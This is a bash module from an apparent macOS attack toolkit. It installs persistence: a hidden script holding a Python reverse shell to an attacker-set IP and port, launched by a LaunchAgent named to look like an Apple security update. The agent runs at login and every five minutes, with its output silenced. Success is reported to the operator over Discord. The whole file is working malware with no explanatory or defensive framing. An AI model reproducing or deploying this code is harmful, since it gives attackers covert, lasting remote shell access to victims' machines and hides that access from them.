#!/bin/bash
# ============================================================
# LaunchAgent Persistence for macOS - Modular Remote Payload
# ============================================================
# Creates a LaunchAgent for persistence
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Persistence failed on $SYSID - Missing IP or PORT"
    exit 1
fi

AGENT_DIR="$HOME/Library/LaunchAgents"
AGENT_NAME="com.apple.security.update"
AGENT_PATH="$AGENT_DIR/$AGENT_NAME.plist"
SCRIPT_PATH="$HOME/.cache/.updater"

# Create directories
mkdir -p "$AGENT_DIR"
mkdir -p "$(dirname "$SCRIPT_PATH")"

# Create reverse shell script
cat > "$SCRIPT_PATH" << EOF
#!/bin/bash
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/zsh','-i'])"
EOF
chmod +x "$SCRIPT_PATH"

# Create LaunchAgent plist
cat > "$AGENT_PATH" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$AGENT_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF

# Load the agent
launchctl load "$AGENT_PATH" 2>/dev/null

send_discord "🔒 **Persistence Installed on $SYSID** (macOS)\n• Method: LaunchAgent\n• Runs every 5 min + on login\n• Target: $IP:$PT"

